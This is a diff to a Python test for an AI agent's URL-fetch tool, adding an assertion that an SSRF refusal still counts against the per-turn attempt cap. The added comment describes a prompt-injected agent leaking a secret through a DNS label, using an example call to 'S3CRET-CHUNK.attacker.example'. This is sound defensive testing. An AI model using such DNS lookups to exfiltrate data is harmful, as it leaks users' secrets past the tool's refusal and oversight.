@@ -637,3 +637,18 @@ async def test_fetch_tool_ssrf_refusal_hides_the_internal_address(
     with pg_session_factory() as s:
         job = s.scalar(select(TurnJob).where(TurnJob.id == jobid))
     assert job.fetch_count == 0
+
+    # 5. THE ATTEMPT WAS STILL SPENT, and that is an ORDERING assertion (review
+    # 2026-10-26 final, M5). The refusal happens inside `resolve_public_ip`'s
+    # `getaddrinfo`, which means the DNS QUERY went out: an injected agent calling
+    # `fetch_reference("https://S3CRET-CHUNK.attacker.example/x")` leaks the chunk
+    # in the DNS label even though no HTTP request is made and the tool answers
+    # with a refusal. The only thing bounding that channel is that
+    # `_claim_fetch_attempt` sits ABOVE the resolve, so a refusal costs an
+    # attempt and the per-turn attempt cap applies to it — and before this
+    # assertion existed, `grep -rn "fetch_attempts_this_turn" tests/` returned
+    # NOTHING, so a plausible "don't charge the member for a refusal"
+    # optimisation would have unbounded the channel with the suite still green.
+    # The full fix (a hostname allowlist, so the lookup never happens) is out of
+    # scope; this pins the bound that exists.
+    assert ctx.fetch_attempts_this_turn == 1, ctx.fetch_attempts_this_turn
